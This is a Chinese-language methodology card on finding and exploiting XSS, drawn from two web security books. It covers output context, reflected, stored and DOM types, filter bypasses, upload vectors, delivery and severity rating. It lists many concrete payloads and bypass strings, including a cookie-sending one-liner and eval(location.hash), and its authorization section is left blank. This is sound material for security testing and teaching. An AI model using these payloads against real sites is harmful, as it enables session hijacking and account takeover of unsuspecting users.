# XSS：按输出语境选向量，按投递方式判危害

## R — 原文 (Reading)

> "Determine, from the location within the HTML of the user-controllable string, how you need to modify it to cause execution of arbitrary script."
>
> 译：根据用户可控字符串在 HTML 中的位置，判断需要怎样改写它才能执行任意脚本。

> — 《The Web Application Hacker's Handbook》Ch12 / Finding and Exploiting Reflected XSS Vulnerabilities

> "在 HTML 中，根据字符所处位置的不同，应当转义的元字符也会发生变化。"
>
> — 《Web 应用安全权威指南》4.3.1 跨站脚本（表 4-4）

> "The two vulnerabilities together represented a critical risk to the application's security."
>
> 译：这两个漏洞合在一起，构成了对该应用安全性的严重风险。

> — 《The Web Application Hacker's Handbook》Ch12 / Chaining XSS and Other Attacks

## I — 方法论骨架 (Interpretation)

XSS 不是「输入 `<script>` 就完事」，而是三条互相独立的判断，任一条判错都会得出「打不进去」的假结论：

1. **落点（上下文）**。同一段输入落在 HTML 正文、属性值、URL 属性、`<script>` 字符串、模板字符串、注释里，需要的 payload 完全不同。判据不是「有没有回显」，而是「回显落在哪种语法的哪个位置」——所以第一步永远是提交一个高熵唯一串，再读**原始源码**（不是渲染后的 DOM）定位。
2. **执行（谁在解释）**。反射型由服务端把 payload 写进响应；存储型由服务端先存后显；DOM 型完全不经过服务端——payload 可能只在 `#` 之后，服务端过滤器根本看不到。三者要用三种不同的找法：反射用「唯一串灌参数 + 看源码」，存储用「逐参数唯一串 + 走完全流程 + 回看后台/日志」，DOM 用「source → sink 静态审计 + 构造 URL」。
3. **投递（怎么让受害者触发）**。「有没有一条能发给受害者的 URL」决定交付方式，不决定漏洞是否存在。GET 型可发链接或 `<img src>`；POST 型用攻击者页面上的自动提交表单；Cookie 型要先能设置该 cookie；Referer 型要先控制来源页。POST-only 不等于不可利用，这是最常被写进报告的错判。

过滤器的三类分诊是这套方法的枢纽：**签名过滤**（请求被拒/换错误页）、**清洗编码**（内容还在但被转义/删除）、**长度截断**（只剩前 N 个字符）。三类现象的绕过资源完全不同——把它们混为一谈，就会在「换 payload」上无限循环。

最后是危害判断：XSS 的等级不取决于「弹了个 alert」，而取决于「受害者是否需要交互、被击中时是否已登录、受害者池有多大、能否与其他低危缺陷串联」。存储型 + 一个越权写入点，可以从中危变成 critical。

## A1 — 应用示例 (Application Example)

### 示例 1: 反射点的上下文定位
- **类型与来源**: 【例题】《The Web Application Hacker's Handbook》Ch12（`/search/28/`、`/search/36/`）
- **问题/输入**: 一个搜索参数，输入会被回显在结果页。
- **方法论的使用**: ① 提交全字母、全站不存在的唯一串（如 `myxsstestdmqlwp`），逐个参数试（GET 与 POST 都测，含 `Referer`/`User-Agent`），记录所有出现位置；② 同一参数多处回显时，每处单独当候选漏洞处理；③ 读源码定位置：`<input value="...">` → 闭合引号+闭合标签或注入事件处理器；`<script>var a='...'</script>` → 闭合单引号+分号+代码+`//`；`<a href="...">` → `javascript:` 或事件处理器；HTML 正文 → 直接标签；④ 提交匹配上下文的 payload，确认响应中未被修改；⑤ 在真实浏览器里确认 `alert` 弹出（而非只看源码）。
- **结论**: 「先证明输入被原样反射，再证明反射点可执行」——两步分开才能定位失败原因。
- **结果**: 原书以系列实验演示不同上下文与过滤器下的构造，未逐例给出完整利用链。

### 示例 2: 清洗过滤的三种绕过
- **类型与来源**: 【例题】《The Web Application Hacker's Handbook》Ch12 / Beating Sanitization（`/search/48/`、`/search/52/`）
- **问题/输入**: 提交 `<script>alert(1)</script>` 后，返回的内容里标签被删除（不是被拒绝）。
- **方法论的使用**: ① 判定为「清洗」而非「签名过滤」（内容变形但存在）；② 若删 `<script>` → 试 `<scr<script>ipt>` 验递归（删一次还剩一次）；③ 若先删 `<script>` 再删 `<object>` → 试 `<scr<object>ipt>` 验处理顺序；④ 若转义引号 → 检查反斜杠本身是否被转义（`foo\'; alert(1);//`）；⑤ 事件处理器内可试 `&apos;`，因为浏览器会先 HTML 解码再当 JS 执行；⑥ 每次绕过都以「浏览器实际执行」为准。
- **结论**: 清洗的顺序与递归性是绕过入口，而不是「过滤了什么字符」。
- **结果**: 原书以该组实验演示递归与处理顺序两类绕过。

### 示例 3: DOM 型的 source → sink
- **类型与来源**: 【例题】《The Web Application Hacker's Handbook》Ch12 / DOM-Based XSS（`/error/18/`、`/error/76/`）
- **问题/输入**: 页面响应是静态的，提交任何参数都看不到回显。
- **方法论的使用**: ① 收集全部客户端 JS；② 搜 source：`document.location`、`document.URL`、`document.referrer`、`window.location`；③ 搜 sink：`document.write()`、`innerHTML`、`eval()`、`setInterval()`、`setTimeout()`；④ 判断每条 source→sink 路径中间是否有可绕过的校验；⑤ 服务端有过滤时把 payload 放到 `#` 片段后（浏览器不发 fragment 给服务器），或放到服务端不校验的虚构参数后（`&foo=<script>...`）；⑥ 用构造 URL 在浏览器验证。
- **结论**: DOM 型的判据是数据流，不是响应内容；服务端过滤器可能完全看不到这条链。
- **结果**: 原书以该组实验演示 fragment 与虚构参数两种绕过。

### 示例 4: 存储型 + 越权写入 = critical
- **类型与来源**: 【亲历】《The Web Application Hacker's Handbook》Ch12 / Chaining XSS and Other Attacks
- **问题/输入**: 一个「显示名」字段存在存储型 XSS，但原本只显示给用户本人；另有一个「任意用户可改他人显示名」的越权缺陷。
- **方法论的使用**: ① 先用逐参数唯一串确认显示名会被存下并在页面渲染（存储型成立）；② 判断受害者范围：只显示给本人 → 单看是中低危；③ 找第二个弱点：改他人显示名的请求只校验了目标存在、没校验归属 → 可给所有用户注入；④ 串联：把 payload 写进所有用户（含管理员）的显示名，等管理员打开用户列表即触发，劫持其会话并提权；⑤ 定级按「最终能力」（控制整个应用）而非「单个 bug」。
- **结论**: 两个各自低危的缺陷串联后可成 critical；「这个 XSS 只能打自己」是原书明确列为 COMMON MYTH 的错误判断。
- **结果**: 原书说明该组合最终评为 critical。

## A2 — 触发场景 (Future Trigger) ★

### 用户会在什么情境下需要它
1. 参数里提交了 `<script>` 但页面没弹窗，需要判断是「没回显」「被转义」还是「上下文不对」。
2. 页面 View Source 几乎为空（SPA），怀疑 DOM 型 XSS。
3. 有个人资料、评论、工单、日志等「先存后显」的功能，想知道哪里能打存储型。
4. 只有 POST 接口能触发，不知道还能不能利用（能不能发出去）。
5. 上传头像/附件，想知道能否借文件让其他用户的浏览器执行脚本。
6. 手里有一个 XSS 和一个越权/CSRF，需要判断能不能串成高危。

### 语言信号（出现这些就该激活）
- 中文：「XSS 怎么手工验」「输入被转义了还能打吗」「DOM XSS 怎么找」「存储型 XSS 怎么找」「POST 型 XSS 怎么利用」「上传头像能 XSS 吗」「这个漏洞算高危吗」
- English: "reflected XSS testing", "XSS context", "XSS filter bypass", "DOM-based XSS", "source and sink", "stored XSS", "upload XSS", "XSS delivery", "severity rating"

### 与相邻能力的区分
- 与 `server-request-injection` 的区别：那条卡的载荷是 URL/XML/换行符，终态多在服务端；本卡终态在受害者浏览器。
- 与 `csrf-ui-redress` 的区别：CSRF 不执行脚本、只借 cookie 发请求；XSS 在目标域内执行 JS，可读响应、可绕过 CSRF token。
- 与 `waf-bypass-encoding` 的区别：本卡处理「应用代码的清洗/编码缺陷」与「HTML 语法约束」；那张卡处理「外部设备/网络层的拦截」。
- 与 `source-code-audit` 的区别：DOM 型与白盒 XSS 可以直接读代码；本卡给的是黑盒判据与构造方法。

## E — 可执行步骤 (Execution)

**必需输入**: 全部输入入口清单（含 header、fragment、文件上传）；能读原始响应与源码的代理；一个可执行 JS 的真实浏览器。缺浏览器就只能验「payload 未被改写」，不能断言可利用。

**交付物与完成标准**: 每个点一行「类型（反射/存储/DOM）→ 落点上下文 → payload → 投递方式 → 影响」；完成标准是浏览器里真实执行（`alert`/`document.domain` 可见），且能说清受害者需要做什么。

1. **筛回显：唯一串灌全部入口**
   - 做什么：生成高熵唯一串（如 `XSS_BY_<随机>`），逐参数提交（URL 参数、路径段、fragment、表单、下拉框、数值框、header），在 View Source 里搜该串。
   - 完成标准：把「上百个参数」分成有回显/无回显两堆，且排除了「页面本来就有这段文字」。
   - 判停：完全无回显 → 转第 5 步（DOM 型）；有回显 → 进第 2 步。

2. **定上下文：读源码而不是看渲染**
   - 做什么：定位落点前后各 30 字符，归类为：标签外、属性值内（双/单引号或无引号）、`<script>` 字符串内、事件处理器内、`<title>/<style>/<textarea>/<xmp>` 等特殊元素内、URL 属性（`href/src/data/action`）、模板字符串内、HTML 注释内。
   - 完成标准：能写出该上下文的**结束边界字符**（正文是 `<`，属性是 `"`，script 内是 `</`）。
   - 判停：落点在 `</tag>` 内部时先闭合标签，否则整串被当文本。

3. **构造并验证**
   - 做什么：按位置选最小构造——标签外/属性内：`<svg onload=alert(1)>`，属性内先闭合 `"><svg onload=alert(1)>`；`<script>` 字符串内：`'-alert(1)-'`、`'/alert(1)//`（引号被反斜杠转义时用 `\'/alert(1)//`）；函数/条件块内：`'}alert(1);{`；模板字符串：`${alert(1)}`；注释内：前面加 `-->`；URL 属性：`javascript:alert(1)`；无法用 `>` 终止标签：`"onmouseover=alert(1) //`。
   - 完成标准：响应中 payload 未被修改，且浏览器执行。
   - 判停：被改写 → 进第 4 步分诊。

4. **过滤器三分类与绕过**
   - 做什么：① 攻击串被整体拒绝/换错误页 → 签名过滤：逐段删字符定位触发词，改用事件处理器/`data:`/`javascript:`/CSS expression，再叠大小写、NULL 字节、异常分隔符、HTML 实体、非标准字符集；② 内容变形但存在 → 清洗：验递归（`<scr<script>ipt>`）、验处理顺序（`<scr<object>ipt>`）、验反斜杠是否被转义、事件内试 `&apos;`；③ 只剩前缀 → 截断：用最短 API（``open("//a/"+document.cookie)``、`<script src=http://a></script>`）、把 payload 拆到同页多个反射点并用 `/* */` 注释中间 HTML、或注入 `eval(location.hash.slice(1))` 把长 payload 放 `#` 后。
   - 完成标准：每次绕过都以浏览器执行为准，不以字符串出现为准。
   - 判停：某 payload 只在一种浏览器生效仍算漏洞，但不能当通杀；把所有失败都归因于 WAF 会错过应用自身缺陷。

5. **DOM 型：source → sink 审计**
   - 做什么：收集全部 JS（静态页与动态页）；grep source（`document.location`/`URL`/`referrer`/`window.location`）与 sink（`document.write`/`innerHTML`/`eval`/`execScript`/`setInterval`/`setTimeout`）；对每条可达链判断中间校验是否可绕；构造 URL 验证；服务端有过滤时把 payload 放 `#` 后或虚构参数后。
   - 完成标准：能画出一条「source → 处理 → sink」的可执行路径。
   - 判停：仅静态阅读漏掉运行时拼接/解码时，用断点/watch 动态跟踪。

6. **存储型：逐参数唯一串 + 全流程**
   - 做什么：为每个参数生成不同唯一串（唯一串+字段名）；把所有多步流程走到完成（确保落库）；再遍历全站（个人资料、用户列表、消息、工单、管理后台、日志查看器、导出文件）；重点看「非管理员可控数据在管理员区域展示」的位置。
   - 完成标准：每个「输入参数 → 输出位置」配对都能对上号。
   - 判停：数据在存储/展示时被截断或实体化，唯一串匹配失败 → 改用短串 + 上下文特征定位。

7. **上传与文件型**
   - 做什么：上传只含 `<script>` 的 `.html` 看是否执行；被拒换 `.txt`/`.jpg`；抓下载响应看 `Content-Type` 与 `Content-Disposition`；内容校验严格时构造混合文件（GIF 头 + HTML/JAR）；文件名注入（`"><svg onload=alert(1)>.gif`）、元数据注入（`exiftool -Artist='...'`）、SVG 内嵌脚本；Ajax 取 `#` 后路径写 `innerHTML` 的场景构造 `#profiles/images/x.jpg`。
   - 完成标准：能给出「扩展名/内容校验/Content-Type/Disposition」四元组中能渲染的组合。
   - 判停：`Content-Disposition: attachment` 会让绝大多数 payload 失效；服务端强制重命名且不保留原名时文件名注入失效。

8. **定投递方式**
   - 做什么：判定触发器——GET 直接发链接或 `<img src>`；POST 在攻击者页写隐藏字段表单并 `submit()`（先试改请求方法看能否转 GET）；Cookie 先找能设置该 cookie 的功能（偏好设置）配合 CSRF；Referer 让受害者先访问含 payload 的页面；站内广告/站内跳转可把请求变成「同站」以绕过基于跨站判断的过滤器。
   - 完成标准：能写出「受害者需要做什么动作」的一句话。
   - 判停：转不成 GET 不等于不可利用；严格 JSON 接口需另找路径。

9. **定级与串联**
   - 做什么：问五件事——是否需要受害者交互（需要则降一档）；被击中时是否已登录；受害者池与角色（未认证公开页 > 普通用户区 > 管理员区，按「能拿到谁的会话」判断）；能否与其他低危缺陷串联（写入点 + 越权读/改）；最终能做什么（劫持会话/创建管理员/读敏感数据）。
   - 完成标准：报告里写清前提条件（是否需登录、是否需交互），不把理论链写成无条件严重。
   - 判停：只有「弹窗证明」而无影响说明时，按信息级处理。

## B — 边界 (Boundary) ★

### 不要用的情况
- 全站响应头带严格 CSP（`script-src 'self'` 且无 `unsafe-inline`）且无 JSONP/可控脚本源：多数注入型 XSS 无法执行，应先评估 CSP 是否有可绕过的白名单域。
- 输入只落在 `Content-Type: text/plain` 的响应里、或被强制 `Content-Disposition: attachment` 下载：浏览器不渲染为 HTML，XSS 不成立。
- 目标使用富文本白名单净化（如 DOMPurify + 严格配置）且版本无已知绕过：不要在标签变形上无限耗。

### 已知失败模式
- **只看「字符串是否出现」**：被部分编码/截断后仍可能执行，也可能完全不可执行；必须以浏览器执行判定。
- **只测 GET 与页面参数**：漏 POST 入口与 header 入口（header 注入需特定构造）。
- **用渲染后的 DOM 判断落点**：DOM 型与源码型的落点不同，会误判。
- **同一唯一串用于所有参数**：看到回显时无法归因到哪个参数、经过哪套过滤器。
- **不跑完多步流程**：数据根本没落库，却以为「没有存储型」。
- **只测「提交后立即回显」的页面**：漏掉所有存储型。
- **把「只能打自己」当结论**：原书明确列出该误区，应先找是否存在越权写入。
- **把 HTML 编码当事件处理器上下文的防御**：浏览器会先解码再当 JS 执行（`&apos;` 可闭合）。
- **只试 `.html` 被拒就放弃上传 XSS**：`.jpg`/`.txt` 仍可能被当 HTML 渲染。
- **只测主站**：移动版/旧版路径常漏配安全头，且与主站共享会话。

### 作者与时代的局限
- GIFAR、Java applet、Flash 相关技巧在现代浏览器已失效；「混合格式文件」的思路仍适用于其他可执行格式（如 SVG + 图片）。
- 书中 IE XSS Filter 的绕过技巧（同站化、拆分同名参数）已随 IE 退场而失效，但「过滤器与后端解析不一致」这一原理仍适用于现代 WAF。
- 现代前端框架默认转义，反射型 XSS 的主战场已转向「`dangerouslySetInnerHTML`/`v-html`/`innerHTML` 的误用」与「DOM 型」，本卡的上下文判据仍适用，但落点清单需补框架特有 sink。

### 容易混淆的方法
- **反射 vs 存储 vs DOM**：区别在「payload 从哪来、经过谁」；三者的找法不同，不能互相替代。
- **XSS vs CSRF**：XSS 在目标域执行 JS（可读响应、可绕 token），CSRF 只借 cookie 发请求（读不到响应）。
- **XSS vs 点击劫持**：后者不执行攻击者脚本在目标域内，只诱导用户在目标界面内点击。
- **XSS vs 模板注入**：SSTI 在服务端渲染阶段执行（危害通常更高），XSS 在浏览器执行；`{{7*7}}` 返回 49 属前者。

### 授权与合规边界
> 待补充（用户自行填写）
